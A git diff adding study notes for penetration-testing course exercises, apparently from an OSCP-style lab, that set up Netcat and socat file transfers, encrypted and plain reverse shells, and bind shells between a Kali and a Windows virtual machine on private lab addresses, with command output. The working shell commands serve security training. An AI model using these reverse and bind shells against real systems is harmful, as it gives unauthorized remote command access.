@@ -237,9 +237,125 @@ export HISTFILESIZE=10000
 export HISTTIMEFORMAT='%c'
 ```
 
-### 4.1.4.3 (page 81) (Netcat exercises, do them!)
+### 4.1.4.3 (page 81) (Reporting is not needed!)
+1. Implement a simple chat between your Kali machine and Windows system.
+2. Use Netcat to create a:
+a. Reverse shell from Kali to Windows.
+b. Reverse shell from Windows to Kali.
+c. Bind shell on Kali. Use your Windows system to connect to it.
+d. Bind shell on Windows. Use your Kali machine to connect to it.
+3. Transfer a file from your Kali machine to Windows and vice versa.
+4. Conduct the exercises again with the firewall enabled on your Windows system. Adapt the exercises as necessary to work around the firewall protection and understand what portions of the exercise can no longer be completed successfully.
 
 ### 4.2.4.1 (page 85) (Socat exercises, do them!)
+1. Use socat to transfer powercat.ps1 from your Kali machine to your Windows system. Keep the file on your system for use in the next section.
+
+Make the script available from Kali on port 80:
+```
+sudo socat TCP4-LISTEN:80,fork file:powercat.ps1
+```
+
+Get it from Windows:
+```
+socat.exe TCP4-CONNECT:10.0.2.15:80 file:powercat.ps1,create
+```
+
+2. Use socat to create an encrypted reverse shell from your Windows system to your Kali machine.
+
+Set up listener on Kali box. First create the ssl key and certificate:
+```
+openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 36 -out shell.crt
+Generating a RSA private key
+.................+++++
+...............+++++
+writing new private key to 'shell.key'
+-----
+You are about to be asked to enter information that will be incorporated
+into your certificate request.
+What you are about to enter is what is called a Distinguished Name or a DN.
+There are quite a few fields but you can leave some blank
+For some fields there will be a default value,
+If you enter '.', the field will be left blank.
+-----
+Country Name (2 letter code) [AU]:
+State or Province Name (full name) [Some-State]:
+Locality Name (eg, city) []:
+Organization Name (eg, company) [Internet Widgits Pty Ltd]:
+Organizational Unit Name (eg, section) []:
+Common Name (e.g. server FQDN or YOUR name) []:
+Email Address []:
+```
+
+Generate .pem file from them:
+```
+$ cat shell.key shell.crt > shell.pem
+```
+
+Run listener from the Kali machine using as certificate the generated pem file:
+```
+sudo socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0,fork STDOUT
+```
+
+Trigger reverse shell from Windows:
+```
+socat.exe OPENSSL-CONNECT:10.0.2.15:4444,verify=0 EXEC:cmd.exe,pipes
+```
+
+3. Create an encrypted bind shell on your Windows system. Try to connect to it from Kali without encryption. Does it still work?
+socat - TCP4-CONNECT:10.0.2.4:4444
+
+Bind shell from the Windows machine:
+```
+C:\Users\User>repositories\socat-windows\socat.exe -d -d OPENSSL-LISTEN:4444,cert=shell.pem,verify=0,fork EXEC:cmd.exe,pipes
+      1 [main] socat 5564 find_fast_cwd: WARNING: Couldn't compute FAST_CWD pointer.  Please report this problem to
+the public mailing list cygwin@cygwin.com
+2020/11/04 14:01:24 socat[5564] N listening on AF=2 0.0.0.0:4444
+```
+
+Connect from Kali using an insecure connection (using TCP4-CONNECT):
+```
+socat - TCP4-CONNECT:10.0.2.4:4444
+```
+
+Even though the connection is accepted on the Windows machine, the shell is not accessible from Kali.
+
+Socat's logs on Windows:
+```
+2020/11/04 14:01:27 socat[5564] N accepting connection from AF=2 10.0.2.15:42078 on AF=2 10.0.2.4:4444
+2020/11/04 14:01:27 socat[5564] N forked off child process 1584
+2020/11/04 14:01:27 socat[5564] N listening on AF=2 0.0.0.0:4444
+2020/11/04 14:02:15 socat[1584] E SSL_accept(): socket closed by peer
+2020/11/04 14:02:15 socat[1584] N exit(1)
+2020/11/04 14:02:15 socat[5564] W waitpid(): child 1584 exited with status 1
+```
+
+On Kali (shell is not working):
+```
+$ socat - TCP4-CONNECT:10.0.2.4:4444
+whoami
+dir
+```
+
+4. Make an unencrypted socat bind shell on your Windows system. Connect to the shell using Netcat. Does it work?
+Note: If cmd.exe is not executing, research what other parameters you may need to pass to the EXEC option based on the error you receive.
+
+Bind shell from Windows:
+```
+socat.exe -d -d TCP4-LISTEN:4445,fork EXEC:cmd.exe,pipes
+```
+
+Connect from Kali using Netcat:
+```
+nc 10.0.2.4 4445
+Microsoft Windows [Version 10.0.19041.572]
+(c) 2020 Microsoft Corporation. All rights reserved.
+
+C:\Users\User>whoami
+whoami
+windev2009eval\user
+```
+
+This proves it is possible to bind a shell using socat (using TCP4) and then connect to it using netcat.
 
 ### 4.3.8.1 (page 94)
 Boxes IPs:
